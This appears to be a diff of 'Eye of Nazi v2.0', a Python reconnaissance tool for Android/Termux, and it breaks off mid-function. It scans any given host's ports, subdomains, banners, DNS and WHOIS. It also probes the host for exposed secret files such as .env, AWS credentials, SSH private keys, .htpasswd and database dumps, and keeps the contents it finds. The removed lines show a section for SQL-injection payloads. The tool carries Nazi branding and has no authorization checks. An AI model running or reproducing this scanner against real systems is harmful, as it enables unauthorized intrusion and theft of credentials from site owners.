@@ -1,970 +1,758 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# EYE OF NAZI v2.0 - INFORMATION GATHERER
-# Made by Cyber Kurd Team
+# language: Python, file: eye_of_nazi.py, target: Android/Termux
+# ═══════════════════════════════════════════════════════════════════
+#                    E Y E   O F   N A Z I   v2.0
+#           20 Advanced Features · HTML Report · Termux Ready
+# ═══════════════════════════════════════════════════════════════════
+# پێویست: pkg install python && pip install requests beautifulsoup4 dnspython
 
-import sys, os, re, ssl, json, socket
-import urllib.parse, urllib.request, urllib.error
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import os, sys, re, json, time, socket, ssl, ftplib, hashlib, hmac
+import urllib.request, urllib.parse, subprocess, random, threading
+import base64, ipaddress, concurrent.futures
+from datetime import datetime
+from collections import defaultdict
 
+try:
+    import requests
+    from bs4 import BeautifulSoup
+    import dns.resolver
+except ImportError:
+    print("[!] pip install requests beautifulsoup4 dnspython")
+    sys.exit(1)
+
+# ─── CONFIG ───────────────────────────────────────────────────────
+VERSION = "2.0"
+LOGFILE = "eye_of_nazi_log.txt"
+REPORT_FILE = "eye_of_nazi_report.html"
+THREADS = 200
+TIMEOUT = 5.0
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+]
+
+def ua():
+    return {"User-Agent": random.choice(USER_AGENTS)}
+
+# ─── COLORS ───────────────────────────────────────────────────────
+class C:
+    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
+    M="\033[95m"; C="\033[96m"; W="\033[97m"; RESET="\033[0m"; BOLD="\033[1m"
+
+# ─── FINDINGS ─────────────────────────────────────────────────────
+FINDINGS = []
+
+def add_finding(sev, title, detail=""):
+    FINDINGS.append({"severity": sev, "title": title, "detail": detail})
+    color = {"CRITICAL": C.R, "HIGH": C.M, "MEDIUM": C.Y, "LOW": C.C, "INFO": C.W}.get(sev, C.W)
+    print(f"{color}[{sev}] {title} — {str(detail)[:100]}{C.RESET}")
+
+# ─── LOGGER ───────────────────────────────────────────────────────
+class Logger:
+    def __init__(self, path):
+        self.path = path
+        self.lock = threading.Lock()
+    def log(self, msg, level="INFO"):
+        stamp = datetime.now().strftime("%H:%M:%S")
+        colors = {"INFO": C.C, "OK": C.G, "WARN": C.Y, "ERR": C.R, "HIT": C.M}
+        col = colors.get(level, C.W)
+        line = f"[{stamp}] [{level}] {msg}"
+        with self.lock:
+            print(f"{col}{line}{C.RESET}")
+            with open(self.path, "a", encoding="utf-8") as f:
+                f.write(line + "\n")
+
+LOG = Logger(LOGFILE)
+
+# ─── LOGO (لەناو کۆدەکەدا) ────────────────────────────────────────
 LOGO = r"""
-\033[91m\033[1m
-⠀⣄⣤⣤⣤⣤⣤⣤⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⢹⡿⢿⣿⣿⣿⣿⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⠷⠀⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⢸⣿⡿⠿⠀⠈⠀⠀⠁⠖⡿⣿⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣏⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣦⣿⣛⡀⠀⠀⢻⣷⡆⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠠⣶⣶⣿⡿⠆⠀⠀⠀⢨⣿⣷⣇⠀⢀⠀⠀⠀⠀⠀⣿⣿⣿⡯⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣇⣀⣐⣤⣾⣿⣿⣿⣿⣿⢀⠀⠀⣀⠀⠀⢸⣿⣿⣿⣿⣾⣿⣣⣀⣀⣿⣿⣿⣷⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣤⣤⣿⣤⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⠭⠽⠋⠉⠩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠉⠉⡍⠭⠹⣿⣿⡏⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⣀⣀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠀⣀⣀⣀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣇⡄⢀⣿⣿⣿⣿⣿⣿⣿⡟⣻⡟⢻⣿⣿⣿⣿⣿⣭⣄⣤⣿⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠨⣿⣿⣿⣿⠍⠉⠙⠉⠉⠉⠉⠉⢹⣿⣿⣿⠩⠅⣺⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢸⣿⢿⡇⣽⣿⣿⣿⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡆⠀⠻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠃⠀⣿⣿⣿⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣿⣿⣿⡎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢼⣿⣿⣿⣿⣒⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣲⣿⣿⣿⣿⣿⠶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣤⡄⠰⡤⣤⣤⡀⡄⠀⢰⣼⣿⣿⣿⣿⢿⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-\033[0m
-\033[91m\033[1m
-   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
-   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
-   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
-   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
-   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
-   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
-\033[0m\033[93m\033[1m                    EYE OF NAZI
-\033[96m=============================================================\033[0m
-\033[97m\033[1m              INFORMATION GATHERER v2.0\033[0m
-\033[2m              Made by Cyber Kurd Team\033[0m
-\033[96m=============================================================\033[0m
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣤⣤⣤⣤⣤⣤⣤⣤⣤⠄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⡴
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⡖
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⢹⡿⢿⣿⣿⣿⣿⣿⣷⡦
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⠷⠀⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⢸⣿⡿⠿⠀⠈⠀⠀⠁⠖⡿⣿⣿⣿⣇⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣏⣤
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣦⣿⣛⡀⠀⠀⢻⣷⡆⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡟⠛
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠠⣶⣶⣿⡿⠆⠀⠀⠀⢨⣿⣷⣇⠀⢀⠀⠀⠀⠀⠀⣿⣿⣿⡯⠅
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣇⣀⣐⣤⣾⣿⣿⣿⣿⣿⢀⠀⠀⣀⠀⠀⢸⣿⣿⣿⣿⣾⣿⣣⣀⣀⣿⣿⣿⣷⡖
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣤⣤⣿⣤⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⠭⠽⠋⠉⠩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠉⠉⡍⠭⠹⣿⣿⡏⡅
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⣀⣀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠀⣀⣀⣀⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⣿⣿⣿⣿⣿⡿⠇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣇⡄⢀⣿⣿⣿⣿⣿⣿⣿⡟⣻⡟⢻⣿⣿⣿⣿⣿⣭⣄⣤⣿⣿⣿⣿⣿⡃
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠨⣿⣿⣿⣿⠍⠉⠙⠉⠉⠉⠉⠉⢹⣿⣿⣿⠩⠅⣺⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢸⣿⢿⡇⣽⣿⣿⣿⡿⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡆⠀⠻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠃⠀⣿⣿⣿⠶⠛
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣿⣿⣿⡎⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢼⣿⣿⣿⣿⣒⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣲⣿⣿⣿⣿⣿⠶
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡟
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣤⡄⠰⡤⣤⣤⡀⡄⠀⢰⣼⣿⣿⣿⣿⢿⡝
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠋
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠇
 """
 
-# ─── SQLi Payloads ───
+def load_logo():
+    return LOGO
+
+# ─── HELPERS ──────────────────────────────────────────────────────
+def safe_get(url, **kw):
+    try:
+        kw.setdefault("timeout", TIMEOUT)
+        kw.setdefault("headers", ua())
+        return requests.get(url, **kw)
+    except Exception:
+        return None
+
+def safe_post(url, **kw):
+    try:
+        kw.setdefault("timeout", TIMEOUT)
+        kw.setdefault("headers", ua())
+        return requests.post(url, **kw)
+    except Exception:
+        return None
+
+def norm_target(target):
+    if target.startswith("http"):
+        base = target.rstrip("/")
+        host = target.split("//")[1].split("/")[0].split(":")[0]
+    else:
+        host = target.split("/")[0].split(":")[0]
+        base = f"http://{host}"
+    return base, host
+
+def path_to_safe(url):
+    return re.sub(r"[^a-zA-Z0-9._-]", "_", url.split("//")[-1])[:80]# ═══════════════════════════════════════════════════════════════════
+# FEATURE 1 — SUBDOMAIN ENUM (crt.sh + DNS bruteforce)
+# ═══════════════════════════════════════════════════════════════════
+def feat_subdomains(host):
+    LOG.log(f"[1] Subdomain Enum: {host}", "INFO")
+    subs = set()
+    try:
+        r = requests.get(f"https://crt.sh/?q=%25.{host}&output=json", timeout=15)
+        for e in r.json():
+            for n in e.get("name_value","").split("\n"):
+                if n.endswith(host) and "*" not in n:
+                    subs.add(n.strip())
+    except Exception as e:
+        LOG.log(f"    crt.sh نەکرا: {e}", "WARN")
+    common = ["www","mail","api","dev","test","admin","blog","shop","cdn",
+              "static","app","portal","vpn","ftp","smtp","ns1","ns2","webmail"]
+    for sub in common:
+        fqdn = f"{sub}.{host}"
+        try:
+            socket.gethostbyname(fqdn)
+            subs.add(fqdn)
+        except Exception:
+            pass
+    for s in sorted(subs)[:80]:
+        LOG.log(f"    {s}", "OK")
+    return list(subs)
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 2 — PORT SCAN
+# ═══════════════════════════════════════════════════════════════════
+def feat_ports(host, ports=range(1, 1025)):
+    LOG.log(f"[2] Port Scan: {host}", "INFO")
+    open_ports = []
+    def check(p):
+        try:
+            with socket.create_connection((host, p), timeout=1.0):
+                return p
+        except Exception:
+            return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
+        for r in ex.map(check, ports):
+            if r:
+                open_ports.append(r)
+                try:
+                    svc = socket.getservbyport(r)
+                except Exception:
+                    svc = "?"
+                LOG.log(f"    پۆرتی {r} ({svc})", "OK")
+    return open_ports
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 3 — BANNER GRAB
+# ═══════════════════════════════════════════════════════════════════
+def feat_banner(host, port):
+    try:
+        s = socket.socket(); s.settimeout(3)
+        s.connect((host, port))
+        s.send(b"\r\n")
+        data = s.recv(1024).decode(errors="ignore").strip()
+        s.close()
+        if data:
+            LOG.log(f"    [{port}] {data[:120]}", "OK")
+            return data
+    except Exception:
+        pass
+    return None
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 4 — HTTP HEADERS + SECURITY HEADERS
+# ═══════════════════════════════════════════════════════════════════
+def feat_headers(base_url):
+    LOG.log(f"[4] HTTP Headers: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    sec = {
+        "Strict-Transport-Security": "HSTS",
+        "Content-Security-Policy": "CSP",
+        "X-Frame-Options": "Clickjacking",
+        "X-Content-Type-Options": "MIME sniffing",
+        "Referrer-Policy": "Referrer leak",
+        "Permissions-Policy": "Feature policy",
+    }
+    for h, name in sec.items():
+        if h in r.headers:
+            LOG.log(f"    [+] {h}: {r.headers[h][:80]}", "OK")
+        else:
+            add_finding("LOW", f"Header کەم: {h}", name)
+    LOG.log(f"    Server: {r.headers.get('Server','?')}", "OK")
+    LOG.log(f"    X-Powered-By: {r.headers.get('X-Powered-By','?')}", "OK")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 5 — SSL/TLS ANALYSIS
+# ═══════════════════════════════════════════════════════════════════
+def feat_ssl(host):
+    LOG.log(f"[5] SSL/TLS: {host}", "INFO")
+    try:
+        ctx = ssl.create_default_context()
+        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
+            s.settimeout(5); s.connect((host, 443))
+            cert = s.getpeercert()
+            LOG.log(f"    Subject: {dict(x[0] for x in cert.get('subject',[]))}", "OK")
+            LOG.log(f"    Issuer: {dict(x[0] for x in cert.get('issuer',[]))}", "OK")
+            LOG.log(f"    Expires: {cert.get('notAfter')}", "OK")
+            LOG.log(f"    TLS: {s.version()}", "OK")
+    except Exception as e:
+        LOG.log(f"    نەکرا: {e}", "WARN")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 6 — DNS RECON
+# ═══════════════════════════════════════════════════════════════════
+def feat_dns(host):
+    LOG.log(f"[6] DNS: {host}", "INFO")
+    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
+        try:
+            ans = dns.resolver.resolve(host, rtype, lifetime=5)
+            for a in ans:
+                LOG.log(f"    {rtype}: {a}", "OK")
+        except Exception:
+            pass
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 7 — WHOIS
+# ═══════════════════════════════════════════════════════════════════
+def feat_whois(host):
+    LOG.log(f"[7] WHOIS: {host}", "INFO")
+    try:
+        out = subprocess.check_output(["whois", host], timeout=10,
+                                       stderr=subprocess.DEVNULL).decode(errors="ignore")
+        for line in out.splitlines():
+            if any(k in line.lower() for k in
+                   ["registrar:","creation","expiry","name server","org:","country"]):
+                LOG.log(f"    {line.strip()[:120]}", "OK")
+    except Exception as e:
+        LOG.log(f"    WHOIS نەکرا: {e}", "WARN")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 8 — SENSITIVE FILES
+# ═══════════════════════════════════════════════════════════════════
+SENSITIVE_FILES = [
+    "/.env","/.env.local","/.env.production","/.git/config","/.git/HEAD",
+    "/config.php","/wp-config.php","/configuration.php","/settings.py",
+    "/backup.zip","/backup.tar.gz","/backup.sql","/db.sql","/dump.sql",
+    "/database.sql","/phpinfo.php","/info.php","/test.php",
+    "/.htaccess","/.htpasswd","/web.config","/composer.json","/package.json",
+    "/.aws/credentials","/.ssh/id_rsa","/id_rsa","/.DS_Store",
+    "/swagger.json","/openapi.json","/api-docs","/graphql",
+    "/server-status","/.well-known/security.txt","/crossdomain.xml",
+    "/readme.html","/readme.md","/CHANGELOG.md","/LICENSE","/robots.txt",
+]
+
+def feat_files(base_url):
+    LOG.log(f"[8] Sensitive Files: {base_url}", "INFO")
+    def check(path):
+        url = base_url.rstrip("/") + path
+        try:
+            r = requests.get(url, timeout=4, allow_redirects=False, headers=ua())
+            if r.status_code == 200 and len(r.content) > 0:
+                return (path, url, 200, r.content)
+            if r.status_code in (401,403):
+                return (path, url, r.status_code, b"")
+        except Exception:
+            pass
+        return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
+        for res in ex.map(check, SENSITIVE_FILES):
+            if not res: continue
+            path, url, code, content = res
+            if code == 200:
